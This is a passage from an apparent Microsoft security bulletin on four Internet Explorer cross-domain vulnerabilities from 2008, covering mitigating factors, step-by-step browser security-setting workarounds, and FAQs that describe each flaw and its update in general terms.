* By default, all supported versions of Microsoft Outlook and Microsoft Outlook Express open HTML e-mail messages in the Restricted sites zone. The Restricted sites zone helps mitigate attacks that could try to exploit this vulnerability by preventing Active Scripting and ActiveX controls from being used when reading HTML e-mail messages. However, if a user clicks a link in an e-mail message, the user could still be vulnerable to exploitation of this vulnerability through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). This mode sets the security level for the Internet zone to High. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See the FAQ subsection of this vulnerability section for more information about Internet Explorer Enhanced Security Configuration.
* Windows XP Service Pack 2 introduced a security enhancement known as the [Local Machine Zone Lockdown](https://technet.microsoft.com/library/cc782928.aspx). This security enhancement mitigates this vulnerability when the Local Machine Zone is the target of an attack. This feature restricts HTML in the Local Machine zone. This feature also restricts HTML that is hosted in Internet Explorer. These restrictions help mitigate attacks where the Local Machine zone is used as an attack vector to load malicious HTML code. Because of this change, ActiveX script in local HTML pages that are viewed inside Internet Explorer will not run. Also, script in local HTML pages that is viewed inside Internet Explorer prompts the user for permission to run.

#### Workarounds for Window Location Property Cross-Domain Vulnerability - CVE-2008-2947

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones**

  You can help protect against exploitation of this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls and Active Scripting. You can do this by setting your browser security to High.

  To raise the browsing security level in Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to High may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to High.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.
* **Configure Internet Explorer to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone**

  You can help protect against exploitation of this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

#### FAQ for Window Location Property Cross-Domain Vulnerability - CVE-2008-2947

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability for Internet Explorer 5.01 Service Pack 4 or Internet Explorer 6 Service Pack 1 running on Microsoft Windows 2000 Service Pack 4. An attacker who successfully exploited this vulnerability could gain the same user rights as the logged-on user.

If a user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

This is an information disclosure vulnerability for Internet Explorer 6 or Internet Explorer 7 running on supported versions and editions of Windows XP, Windows Server 2003, Windows Vista, and Windows Server 2008. An attacker who successfully exploited this vulnerability could read cookies or other data from another Internet Explorer domain. However, user interaction is required to exploit this vulnerability.

**What causes the vulnerability?**

Internet Explorer incorrectly interprets the origin of script, allowing it to run in the context of a domain or Internet Explorer security zone other than where it originated.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited the remote code execution vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

An attacker who successfully exploited the information disclosure vulnerability could read cookies or other data from another security zone or domain in Internet Explorer.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit the vulnerability through Internet Explorer and then convince a user to visit the Web site. The attacker could also take advantage of compromised Web sites and Web sites that accept or host user-provided content or advertisements. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

A user must be logged on and visiting a Web site for malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations and terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003 or Windows Server 2008. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update enforces security checks when setting the Window location object.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number CVE-2008-2947. Additional CVE numbers that refer to the same vulnerability are CVE-2008-2948 and CVE-2008-2949.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers and had not seen any examples of proof of concept code published when this security bulletin was originally issued.

## HTML Element Cross-Domain Vulnerability - CVE-2008-3472

A remote code execution or information disclosure vulnerability exists in Internet Explorer that could allow script to gain access to a browser window in another domain or Internet Explorer zone. An attacker could exploit the vulnerability by constructing a specially crafted Web page that could allow remote code execution or information disclosure, depending on the operating system, if a user viewed the Web page.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2008-3472](https://www.cve.org/CVERecord?id=CVE-2008-3472).

#### Mitigating Factors for HTML Element Cross-Domain Vulnerability - CVE-2008-3472

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker could host a Web site that contains a Web page that is used to exploit this vulnerability. In addition, compromised Web sites and Web sites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attackerâs Web site.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.
* By default, all supported versions of Microsoft Outlook and Microsoft Outlook Express open HTML e-mail messages in the Restricted sites zone. The Restricted sites zone helps mitigate attacks that could try to exploit this vulnerability by preventing Active Scripting and ActiveX controls from being used when reading HTML e-mail messages. However, if a user clicks a link in an e-mail message, the user could still be vulnerable to exploitation of this vulnerability through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). This mode sets the security level for the Internet zone to High. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See the FAQ subsection of this vulnerability section for more information about Internet Explorer Enhanced Security Configuration.
* Windows XP Service Pack 2 introduced a security enhancement known as the [Local Machine Zone Lockdown](https://technet.microsoft.com/library/cc782928.aspx). This security enhancement mitigates this vulnerability when the Local Machine Zone is the target of an attack. This feature restricts HTML in the Local Machine zone. This feature also restricts HTML that is hosted in Internet Explorer. These restrictions help mitigate attacks where the Local Machine zone is used as an attack vector to load malicious HTML code. Because of this change, ActiveX script in local HTML pages that are viewed inside Internet Explorer will not run. Also, script in local HTML pages that is viewed inside Internet Explorer prompts the user for permission to run.

#### Workarounds for HTML Element Cross-Domain Vulnerability - CVE-2008-3472

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones**

  You can help protect against exploitation of this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls and Active Scripting. You can do this by setting your browser security to High.

  To raise the browsing security level in Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to High may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to High.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.
* **Configure Internet Explorer to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone**

  You can help protect against exploitation of this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

#### FAQ for HTML Element Cross-Domain Vulnerability - CVE-2008-3472

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability for Internet Explorer 6 Service Pack 1 running on Microsoft Windows 2000 Service Pack 4. An attacker who successfully exploited this vulnerability could gain the same user rights as the logged-on user.

If a user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

This is an information disclosure vulnerability for Internet Explorer 6 or Internet Explorer 7 running on supported versions and editions of Windows XP, Windows Server 2003, Windows Vista, and Windows Server 2008. An attacker who successfully exploited this vulnerability could read cookies or other data from another Internet Explorer domain. However, user interaction is required to exploit this vulnerability.

**What causes the vulnerability?**

Internet Explorer incorrectly interprets the origin of script, allowing it to run in the context of a domain or Internet Explorer security zone other than where it originated.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited the remote code execution vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

An attacker who successfully exploited the information disclosure vulnerability could read cookies or other data from another security zone or domain in Internet Explorer.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit the vulnerability through Internet Explorer and then convince a user to visit the Web site. The attacker could also take advantage of compromised Web sites and Web sites that accept or host user-provided content or advertisements. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

A user must be logged on and visiting a Web site for malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations and terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003 or Windows Server 2008. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update properly enforces cross-domain security policy when running scripts.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers and had not seen any examples of proof of concept code published when this security bulletin was originally issued.

## Event Handling Cross-Domain Vulnerability - CVE-2008-3473

A remote code execution or information disclosure vulnerability exists in Internet Explorer that could allow script to gain access to a browser window in another domain or Internet Explorer zone. An attacker could exploit the vulnerability by constructing a specially crafted Web page that could allow remote code execution or information disclosure, depending on the operating system, if a user viewed the Web page.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2008-3473](https://www.cve.org/CVERecord?id=CVE-2008-3473).

#### Mitigating Factors for Event Handling Cross-Domain Vulnerability - CVE-2008-3473

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker could host a Web site that contains a Web page that is used to exploit this vulnerability. In addition, compromised Web sites and Web sites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attackerâs Web site.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.
* By default, all supported versions of Microsoft Outlook and Microsoft Outlook Express open HTML e-mail messages in the Restricted sites zone. The Restricted sites zone helps mitigate attacks that could try to exploit this vulnerability by preventing Active Scripting and ActiveX controls from being used when reading HTML e-mail messages. However, if a user clicks a link in an e-mail message, the user could still be vulnerable to exploitation of this vulnerability through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). This mode sets the security level for the Internet zone to High. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See the FAQ subsection of this vulnerability section for more information about Internet Explorer Enhanced Security Configuration.
* Windows XP Service Pack 2 introduced a security enhancement known as the [Local Machine Zone Lockdown](https://technet.microsoft.com/library/cc782928.aspx). This security enhancement mitigates this vulnerability when the Local Machine Zone is the target of an attack. This feature restricts HTML in the Local Machine zone. This feature also restricts HTML that is hosted in Internet Explorer. These restrictions help mitigate attacks where the Local Machine zone is used as an attack vector to load malicious HTML code. Because of this change, ActiveX script in local HTML pages that are viewed inside Internet Explorer will not run. Also, script in local HTML pages that is viewed inside Internet Explorer prompts the user for permission to run.

#### Workarounds for Event Handling Cross-Domain Vulnerability - CVE-2008-3473

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones**

  You can help protect against exploitation of this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls and Active Scripting. You can do this by setting your browser security to High.

  To raise the browsing security level in Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to High may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to High.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.
* **Configure Internet Explorer to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone**

  You can help protect against exploitation of this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

#### FAQ for Event Handling Cross-Domain Vulnerability - CVE-2008-3473

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability for Internet Explorer 6 Service Pack 1 running on Microsoft Windows 2000 Service Pack 4. An attacker who successfully exploited this vulnerability could gain the same user rights as the logged-on user.

If a user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

This is an information disclosure vulnerability for Internet Explorer 6 or Internet Explorer 7 running on supported versions and editions of Windows XP, Windows Server 2003, Windows Vista, and Windows Server 2008. An attacker who successfully exploited this vulnerability could read cookies or other data from another Internet Explorer domain. However, user interaction is required to exploit this vulnerability.

**What causes the vulnerability?**

Internet Explorer incorrectly interprets the origin of script, allowing it to run in the context of a domain or Internet Explorer security zone other than where it originated.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited the remote code execution vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

An attacker who successfully exploited the information disclosure vulnerability could read cookies or other data from another security zone or domain in Internet Explorer.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit the vulnerability through Internet Explorer and then convince a user to visit the Web site. The attacker could also take advantage of compromised Web sites and Web sites that accept or host user-provided content or advertisements. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

A user must be logged on and visiting a Web site for malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations and terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003 or Windows Server 2008. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update corrects the identification of the domain of an executed script, restricting it to execute in the context of its original domain.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers and had not seen any examples of proof of concept code published when this security bulletin was originally issued.

## Cross-Domain Information Disclosure Vulnerability - CVE-2008-3474

An information disclosure vulnerability exists in Internet Explorer that could allow script to gain access to a browser window in another domain or Internet Explorer zone. An attacker could exploit the vulnerability by constructing a specially crafted Web page that could allow information disclosure if a user viewed the Web page.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2008-3474](https://www.cve.org/CVERecord?id=CVE-2008-3474).

#### Mitigating Factors for Cross-Domain Information Disclosure Vulnerability - CVE-2008-3474

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker could host a Web site that contains a Web page that is used to exploit this vulnerability. In addition, compromised Web sites and Web sites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attackerâs Web site.
* By default, all supported versions of Microsoft Outlook and Microsoft Outlook Express open HTML e-mail messages in the Restricted sites zone. The Restricted sites zone helps mitigate attacks that could try to exploit this vulnerability by preventing Active Scripting and ActiveX controls from being used when reading HTML e-mail messages. However, if a user clicks a link in an e-mail message, the user could still be vulnerable to exploitation of this vulnerability through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). This mode sets the security level for the Internet zone to High. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See the FAQ subsection of this vulnerability section for more information about Internet Explorer Enhanced Security Configuration.

#### Workarounds for Cross-Domain Information Disclosure Vulnerability - CVE-2008-3474

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones**

  You can help protect against exploitation of this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls and Active Scripting. You can do this by setting your browser security to High.

  To raise the browsing security level in Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
